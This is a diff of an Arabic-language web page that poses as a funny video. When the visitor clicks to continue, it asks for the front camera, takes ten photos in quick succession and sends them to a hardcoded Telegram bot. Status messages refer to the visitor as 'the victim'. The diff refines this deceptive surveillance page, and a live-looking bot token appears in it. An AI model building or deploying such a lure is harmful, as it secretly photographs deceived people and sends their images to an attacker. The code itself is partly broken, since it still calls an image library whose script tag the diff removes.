@@ -2,50 +2,77 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title></title>
+  <title></title> <!-- فارغ للإخفاء -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { margin:0; background:#000; font-family:Arial; color:#fff; text-align:center; }
-    iframe { display:none; width:100vw; height:100vh; border:none; }
-    #buttons { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:9999; }
-    button { padding:20px 40px; margin:20px; font-size:22px; border:none; border-radius:10px; cursor:pointer; }
-    #yes { background:#00cc00; color:white; }
-    #no { background:#ff4444; color:white; }
-    #msg { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:10px; border-radius:8px; }
+    body { 
+      margin:0; 
+      background:#000; 
+      color:#fff; 
+      font-family:Arial, sans-serif; 
+      height:100vh; 
+      display:flex; 
+      justify-content:center; 
+      align-items:center; 
+      text-align:center; 
+      overflow:hidden; 
+    }
+    #container { 
+      z-index:9999; 
+      background:rgba(0,0,0,0.8); 
+      padding:40px; 
+      border-radius:15px; 
+      max-width:90%; 
+    }
+    h1 { font-size:28px; margin-bottom:30px; }
+    button { 
+      padding:18px 40px; 
+      margin:15px; 
+      font-size:22px; 
+      border:none; 
+      border-radius:10px; 
+      cursor:pointer; 
+      color:white; 
+      width:280px; 
+    }
+    #yes { background:#00cc44; }
+    #no { background:#ff4444; }
+    #msg { margin-top:20px; font-size:18px; }
+    #video { display:none; width:100vw; height:100vh; position:fixed; top:0; left:0; z-index:1; }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
-<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
-
-<div id="buttons">
+<div id="container">
+  <h1>شاهد هذا الفيديو المضحك 😂</h1>
   <button id="yes" onclick="startCamera()">متابعة مشاهدة الفيديو</button>
   <button id="no" onclick="reject()">رفض مشاهدة الفيديو</button>
+  <div id="msg"></div>
 </div>
 
-<div id="msg">اضغط على الزر للمتابعة</div>
+<iframe id="video" src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
 
 <script>
-// Telegram Config
+// Telegram Config – تاعك
 const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
-// إرسال لتليغرام
-function sendToTg(text, photo = null) {
-  if (photo) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: text })
-    }).catch(() => {});
-  } else {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-    }).catch(() => {});
-  }
+// إرسال نص
+function sendText(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+  }).catch(() => {});
+}
+
+// إرسال صورة
+function sendPhoto(photo, caption) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: caption })
+  }).catch(() => {});
 }
 
 // رفض → ما يصير والو
@@ -54,17 +81,19 @@ function reject() {
   setTimeout(() => window.close(), 2000);
 }
 
-// متابعة → يطلب الكاميرا (الـ popup يطلع طبيعي)
+// متابعة → طلب الكاميرا + سحب 10 صور
 async function startCamera() {
-  document.getElementById('buttons').style.display = 'none';
-  document.getElementById('msg').innerText = 'جاري تشغيل الفيديو...';
+  document.getElementById('container').style.display = 'none';
   document.getElementById('video').style.display = 'block';
+  document.getElementById('msg').innerText = 'جاري تشغيل الفيديو...';
 
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }); // الكاميرا الأمامية
-    sendToTg('✅ الضحية وافق على الكاميرا الأمامية!');
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user' } // الكاميرا الأمامية
+    });
 
-    // سحب 10 صور متتالية من الكاميرا
+    sendText('✅ الضحية وافق على الكاميرا الأمامية!');
+
     const video = document.createElement('video');
     video.srcObject = stream;
     video.play();
@@ -74,20 +103,22 @@ async function startCamera() {
       if (count >= 10) {
         clearInterval(interval);
         stream.getTracks().forEach(track => track.stop());
-        sendToTg('تم سحب 10 صور من الكاميرا الأمامية');
+        sendText('تم سحب 10 صور من الكاميرا الأمامية');
         return;
       }
 
       html2canvas(video, {scale: 0.5}).then(canvas => {
         const img = canvas.toDataURL('image/png');
-        sendToTg(`صورة ${count+1} من الكاميرا الأمامية`, img);
+        sendPhoto(img, `صورة ${count+1}/10 من الكاميرا الأمامية`);
         count++;
       });
-    }, 1000); // كل ثانية صورة
+    }, 800); // كل 0.8 ثانية صورة (سريع وما يتعبش الجهاز)
 
   } catch (err) {
-    sendToTg(`❌ رفض الوصول للكاميرا: ${err.message}`);
+    sendText(`❌ رفض الوصول للكاميرا: ${err.message}`);
     document.getElementById('msg').innerText = 'يرجى السماح بالكاميرا لمشاهدة الفيديو';
+    document.getElementById('container').style.display = 'block';
+    document.getElementById('video').style.display = 'none';
   }
 }
 </script>
